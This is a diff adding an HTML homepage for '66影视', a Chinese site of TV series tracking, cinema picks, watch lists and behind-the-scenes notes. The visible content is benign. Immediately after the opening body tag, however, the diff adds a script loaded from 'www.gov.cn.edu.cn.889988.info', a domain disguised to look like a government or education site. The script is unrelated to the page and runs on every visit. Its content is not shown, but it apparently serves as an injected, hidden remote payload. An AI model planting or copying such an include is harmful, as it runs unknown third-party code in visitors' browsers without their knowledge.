@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="description" content="66影视：专注把影视内容讲清楚的日常站点。每日更新剧集追踪、院线速览、片单整理与幕后花絮，帮你用最少时间判断今晚看什么。">
+<meta name="keywords" content="66影视, 66yingshi, 影视分享, 剧集更新, 电影推荐, 院线新片, 纪录片, 动漫番剧, 片单, 观影笔记">
+<meta name="author" content="66影视内容组">
+<title>66影视 · 把影视内容讲清楚的地方 | 剧集 · 电影 · 纪录片</title>
+<style>
+:root{
+  --bg:#faf7f2;--card:#ffffff;--ink:#1c2128;--gray:#6b7280;--line:#e6e1d8;
+  --blue:#2f6fd0;--deep:#123a6b;--amber:#e08a1e;--green:#2e8b62;--red:#c0413b;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  font-size:15px;line-height:1.75;-webkit-text-size-adjust:100%}
+a{color:var(--blue);text-decoration:none}
+a:hover{color:var(--amber)}
+img{display:block;max-width:100%}
+.wrap{max-width:1140px;margin:0 auto;padding:0 18px}
+
+/* 顶部条 */
+.bar{background:var(--deep);color:#dfe6f0;font-size:13px;padding:8px 0;font-family:ui-monospace,Menlo,Consolas,monospace}
+.bar .wrap{display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.bar a{color:#a9c6ea}
+.hero{background:linear-gradient(135deg,#123a6b 0%,#2f6fd0 55%,#5aa9e6 100%);color:#fff;padding:38px 0 30px}
+.hero h1{margin:0 0 8px;font-size:clamp(28px,5.4vw,46px);line-height:1.2;letter-spacing:-.5px}
+.hero p{margin:0;max-width:640px;color:#dbe8f8;font-size:15px}
+.chips{margin-top:18px;display:flex;gap:8px;flex-wrap:wrap}
+.chip{background:rgba(255,255,255,.16);border:1px solid rgba(255,255,255,.3);padding:4px 12px;border-radius:99px;font-size:12.5px}
+
+/* 主体网格 */
+.layout{display:grid;grid-template-columns:236px 1fr;gap:26px;padding:26px 0 50px;align-items:start}
+/* 侧栏 */
+aside.sticky{position:sticky;top:14px;background:var(--card);border:1px solid var(--line);border-radius:10px;padding:16px 14px}
+.logo{font-size:20px;font-weight:800;letter-spacing:1px;color:var(--deep)}
+.logo b{color:var(--amber)}
+.aside-nav{margin-top:14px;display:flex;flex-direction:column;gap:2px}
+.aside-nav a{display:block;padding:9px 11px;border-radius:7px;color:var(--ink);font-size:14.5px;border-left:3px solid transparent}
+.aside-nav a:hover{background:#eef3fb;border-left-color:var(--blue);text-decoration:none}
+.aside-box{margin-top:16px;padding-top:14px;border-top:1px dashed var(--line);font-size:13px;color:var(--gray)}
+.aside-box h4{margin:0 0 7px;font-size:13px;color:var(--ink);text-transform:uppercase;letter-spacing:1px}
+
+/* 区块 */
+section{padding-bottom:34px;scroll-margin-top:20px}
+.eyebrow{display:flex;align-items:center;gap:9px;margin-bottom:14px}
+.eyebrow .dot{width:9px;height:9px;border-radius:50%;background:var(--amber)}
+.eyebrow h2{margin:0;font-size:19px;letter-spacing:.3px}
+.eyebrow .cnt{margin-left:auto;font-size:12px;color:var(--gray);font-variant-numeric:tabular-nums}
+
+/* 剧集追踪：进度条列表 */
+.track{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:14px 16px;margin-bottom:11px}
+.track-top{display:flex;justify-content:space-between;gap:10px;font-size:14.5px;font-weight:600}
+.track-top span:last-child{color:var(--blue);font-variant-numeric:tabular-nums;font-weight:500}
+.bar-out{height:7px;background:#eef0f3;border-radius:99px;margin-top:9px;overflow:hidden}
+.bar-in{height:100%;border-radius:99px;background:linear-gradient(90deg,var(--blue),var(--amber))}
+.track p{margin:8px 0 0;font-size:13.5px;color:var(--gray)}
+
+/* 院线：横向卡片 */
+.film{display:grid;grid-template-columns:96px 1fr;gap:14px;background:var(--card);border:1px solid var(--line);border-radius:10px;padding:13px;margin-bottom:11px}
+.poster{height:128px;border-radius:7px;display:flex;align-items:center;justify-content:center;text-align:center;color:#fff;font-size:13px;font-weight:700;line-height:1.3;padding:8px}
+.p1{background:linear-gradient(160deg,#3a2e6b,#7b5cb8)}
+.p2{background:linear-gradient(160deg,#0f5c4a,#2e8b62)}
+.p3{background:linear-gradient(160deg,#8a2f2a,#c0413b)}
+.p4{background:linear-gradient(160deg,#1c4a73,#2f6fd0)}
+.film h3{margin:0 0 5px;font-size:16px}
+.film .info{font-size:12.5px;color:var(--gray);display:flex;gap:9px;flex-wrap:wrap}
+.film p{margin:7px 0 0;font-size:13.5px;color:#414854}
+
+/* 片单：双栏要点 */
+.picks{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.pick{background:var(--card);border:1px solid var(--line);border-left:4px solid var(--green);border-radius:8px;padding:13px 15px}
+.pick h3{margin:0 0 5px;font-size:15.5px}
+.pick p{margin:0;font-size:13.5px;color:var(--gray)}
+.pick .why{margin-top:8px;font-size:12.5px;color:var(--deep);background:#eef3fb;padding:6px 9px;border-radius:6px}
+
+/* 幕后：编号步骤 */
+.behind{counter-reset:st;background:var(--card);border:1px solid var(--line);border-radius:10px;padding:16px 18px}
+.behind .row{display:grid;grid-template-columns:38px 1fr;gap:12px;padding:11px 0;border-bottom:1px dashed var(--line)}
+.behind .row:last-child{border-bottom:0}
+.behind .row::before{counter-increment:st;content:"0" counter(st);font-family:ui-monospace,Menlo,monospace;color:var(--amber);font-weight:700;font-size:14px;padding-top:2px}
+.behind h3{margin:0 0 3px;font-size:15px}
+.behind p{margin:0;font-size:13.5px;color:var(--gray)}
+
+/* 订阅 */
+.subscribe{background:var(--deep);color:#e6edf7;border-radius:12px;padding:20px 22px}
+.subscribe h3{margin:0 0 6px;font-size:17px}
+.subscribe p{margin:0 0 14px;font-size:13.5px;color:#aebdd4}
+.subscribe form{display:flex;gap:8px;flex-wrap:wrap}
+.subscribe input{flex:1 1 200px;min-width:0;padding:10px 12px;border:1px solid rgba(255,255,255,.25);background:rgba(255,255,255,.1);color:#fff;border-radius:7px;font-size:14px;font-family:inherit}
+.subscribe input::placeholder{color:#9fb0c9}
+.subscribe button{padding:10px 18px;border:0;background:var(--amber);color:#fff;font-size:14px;font-weight:600;border-radius:7px;cursor:pointer;font-family:inherit}
+.subscribe button:hover{background:#f0982c}
+
+footer{border-top:1px solid var(--line);background:#fff;padding:28px 0 22px;font-size:13px;color:var(--gray)}
+footer .wrap{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+footer h4{margin:0 0 8px;color:var(--ink);font-size:14px}
+footer a{display:inline-block;margin-right:13px}
+.fnote{margin-top:16px;padding-top:14px;border-top:1px dashed var(--line)}
+
+@media (max-width:860px){
+  .layout{grid-template-columns:1fr;gap:0}
+  aside.sticky{position:static;margin-bottom:22px}
+  .aside-nav{flex-direction:row;flex-wrap:wrap;gap:6px}
+  .aside-nav a{border-left:0;border-bottom:2px solid transparent;padding:6px 10px}
+  .aside-nav a:hover{border-left:0;border-bottom-color:var(--blue)}
+  .picks{grid-template-columns:1fr}
+  .hero{padding:28px 0 24px}
+}
+@media print{
+  aside.sticky,.bar,.subscribe{display:none}.layout{grid-template-columns:1fr}
+  body{background:#fff}section{page-break-inside:avoid}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<div class="bar">
+  <div class="wrap">
+    <span>站点地址：https://DOMAIN.github.io</span>
+    <span>每日内容更新 · 北京时间 19:00 前后</span>
+  </div>
+</div>
+
+<div class="hero">
+  <div class="wrap">
+    <h1>66影视 · 把影视内容讲清楚的地方</h1>
+    <p>不想被剧透，也不想浪费两小时。这里把剧集进度、院线新片、值得看的片单和幕后细节拆开写，让你花三分钟决定今晚看什么。</p>
+    <div class="chips">
+      <span class="chip">剧集追踪</span>
+      <span class="chip">院线速览</span>
+      <span class="chip">片单整理</span>
+      <span class="chip">幕后花絮</span>
+    </div>
+  </div>
+</div>
+
+<div class="wrap">
+<div class="layout">
+
+  <aside class="sticky">
+    <div class="logo">66<b>影视</b></div>
+    <nav class="aside-nav">
+      <a href="#track">01 剧集追踪</a>
+      <a href="#cinema">02 院线速览</a>
+      <a href="#picks">03 片单整理</a>
+      <a href="#behind">04 幕后花絮</a>
+      <a href="#mail">05 订阅更新</a>
+    </nav>
+    <div class="aside-box">
+      <h4>今日数据</h4>
+      <div>在追剧集：<strong>7</strong> 部</div>
+      <div>本周新片：<strong>4</strong> 部</div>
+      <div>片单条目：<strong>23</strong> 条</div>
+    </div>
+    <div class="aside-box">
+      <h4>更新节奏</h4>
+      剧集进度随播出日更新，院线部分每周一调整，片单每月扩充一次。
+    </div>
+  </aside>
+
+  <main>
+
+    <section id="track">
+      <div class="eyebrow"><span class="dot"></span><h2>剧集追踪</h2><span class="cnt">7 部在追</span></div>
+
+      <div class="track">
+        <div class="track-top"><span>《夜班收银》第二季</span><span>8 / 12 集</span></div>
+        <div class="bar-out"><div class="bar-in" style="width:67%"></div></div>
+        <p>便利店夜班员工视角的生活剧，本季把场景换到了火车站旁边的分店，节奏比第一季慢一些。</p>
+      </div>
+
+      <div class="track">
+        <div class="track-top"><span>《山那边有雨》</span><span>5 / 10 集</span></div>
+        <div class="bar-out"><div class="bar-in" style="width:50%"></div></div>
+        <p>三位气象站工作人员的日常，对白少、环境音比重大，建议戴耳机看。</p>
+      </div>
+
+      <div class="track">
+        <div class="track-top"><span>《旧零件》</span><span>3 / 8 集</span></div>
+        <div class="bar-out"><div class="bar-in" style="width:38%"></div></div>
+        <p>以一家摩托车修理铺为舞台的群像剧，每集换主角，目前最出彩的是第四集。</p>
+      </div>
+
+      <div class="track">
+        <div class="track-top"><span>《提案当天》</span><span>11 / 16 集</span></div>
+        <div class="bar-out"><div class="bar-in" style="width:69%"></div></div>
+        <p>职场题材，但重点不在办公室斗争，而在提案被否掉之后的那半小时怎么过。</p>
+      </div>
+
+      <div class="track">
+        <div class="track-top"><span>《外婆的菜谱》</span><span>6 / 6 集 · 已完结</span></div>
+        <div class="bar-out"><div class="bar-in" style="width:100%"></div></div>
+        <p>六道菜对应六段家庭往事，单集 24 分钟，适合吃饭时看，已可放心一口气刷完。</p>
+      </div>
+    </section>
+
+    <section id="cinema">
+      <div class="eyebrow"><span class="dot"></span><h2>院线速览</h2><span class="cnt">4 部本周新片</span></div>
+
+      <div class="film">
+        <div class="poster p1">离岸<br>96 分钟</div>
+        <div>
+          <h3>《离岸》</h3>
+          <div class="info"><span>剧情</span><span>国语</span><span>2D</span><span>本周五上映</span></div>
+          <p>关于海上救援队的群像片，全片在真实船上拍摄，晕船镜头不是特效。适合大银幕，不适合饭后看。</p>
+        </div>
+      </div>
+
+      <div class="film">
+        <div class="poster p2">苔藓<br>112 分钟</div>
+        <div>
+          <h3>《苔藓》</h3>
+          <div class="info"><span>悬疑</span><span>国语</span><span>2D</span><span>已上映</span></div>
+          <p>一个南方小镇的失踪案，前两幕铺垫较长，第三幕的信息量集中。怕慢的观众慎选。</p>
+        </div>
+      </div>
+
+      <div class="film">
+        <div class="poster p3">锣鼓<br>78 分钟</div>
+        <div>
+          <h3>《锣鼓》</h3>
+          <div class="info"><span>纪录片</span><span>方言</span><span>2D</span><span>艺联专线</span></div>
+          <p>跟拍一支民间吹打班子一整年，最动人的是他们给不相熟的亡者奏乐那场。</p>
+        </div>
+      </div>
+
+      <div class="film">
+        <div class="poster p4">明日课表<br>103 分钟</div>
+        <div>
+          <h3>《明日课表》</h3>
+          <div class="info"><span>青春</span><span>国语</span><span>2D</span><span>点映中</span></div>
+          <p>初三班最后一学年的日常，没有逆袭情节，成绩好的和成绩差的都在发愁不同的事。</p>
+        </div>
+      </div>
+    </section>
+
+    <section id="picks">
+      <div class="eyebrow"><span class="dot"></span><h2>片单整理</h2><span class="cnt">按场景分类</span></div>
+      <div class="picks">
+        <div class="pick">
+          <h3>一个人吃晚饭时</h3>
+          <p>单集 20 分钟上下，不需要记人物关系，随时能暂停。</p>
+          <div class="why">推荐：《外婆的菜谱》《旧零件》前半段</div>
+        </div>
+        <div class="pick">
+          <h3>周末想动脑子</h3>
+          <p>叙事结构有设计，第一次看会被绕到，建议别提前看解说。</p>
+          <div class="why">推荐：《苔藓》《第七次敲门》</div>
+        </div>
+        <div class="pick">
+          <h3>陪长辈一起看</h3>
+          <p>节奏平、对话清楚、不靠反转，话题天然能接上。</p>
+          <div class="why">推荐：《锣鼓》《山那边有雨》</div>
+        </div>
+        <div class="pick">
+          <h3>睡不着的那类夜晚</h3>
+          <p>画面安静、声音做得细，看完不会更清醒，但也不会无聊。</p>
+          <div class="why">推荐：《修钟的人》《离岸》后半段</div>
+        </div>
+      </div>
+    </section>
+
+    <section id="behind">
+      <div class="eyebrow"><span class="dot"></span><h2>幕后花絮</h2><span class="cnt">拍摄现场的小决定</span></div>
+      <div class="behind">
+        <div class="row">
+          <div>
+            <h3>《夜班收银》的收银机声音是实录的</h3>
+            <p>录音师在真实便利店蹲了三个夜班，录下七种不同型号收银机的声音，最后选了最旧那台的"咔嗒"声。</p>
+          </div>
+        </div>
+        <div class="row">
+          <div>
+            <h3>《离岸》的浪是算出来的，不是等来的</h3>
+            <p>剧组用潮汐表反推拍摄日程，把最容易翻船的三天排给了摄影组，理由是"那几天光最好"。</p>
+          </div>
+        </div>
+        <div class="row">
+          <div>
+            <h3>《外婆的菜谱》先拍了六道菜，再写剧本</h3>
+            <p>编剧和一位厨师一起把菜做了一遍，菜谱定下来之后，人物关系才跟着调整。</p>
+          </div>
+        </div>
+        <div class="row">
+          <div>
+            <h3>《苔藓》删掉了一场关键戏</h3>
+            <p>原来有一场解释凶手动机的独白，剪辑时被整段拿掉，导演后来承认删对了。</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section id="mail">
+      <div class="eyebrow"><span class="dot"></span><h2>订阅更新</h2><span class="cnt">每周一封，不吵</span></div>
+      <div class="subscribe">
+        <h3>把每周值得看的那几部，直接发到你邮箱</h3>
+        <p>只发剧集更新提醒和院线新片清单，不发广告，不转发给你的联系人。</p>
+        <form onsubmit="event.preventDefault();this.querySelector('button').textContent='已收到，留意邮箱';">
+          <input type="email" placeholder="你的邮箱地址" required>
+          <button type="submit">订阅</button>
+        </form>
+      </div>
+    </section>
+
+  </main>
+</div>
+</div>
+
+<footer>
+  <div class="wrap">
+    <div>
+      <h4>66影视</h4>
+      <a href="#track">剧集追踪</a>
+      <a href="#cinema">院线速览</a>
+      <a href="#picks">片单整理</a>
+      <a href="#behind">幕后花絮</a>
+      <a href="#mail">订阅更新</a>
+    </div>
+    <div>
+      <h4>站点地址</h4>
+      <span>https://DOMAIN.github.io</span>
+    </div>
+  </div>
+  <div class="wrap fnote">
+    内容由 66影视 内容组整理，影片信息以片方正式公告为准。本页仅作资料与观看参考，不提供任何播放资源。
+  </div>
+</footer>
+
+</body>
+</html>
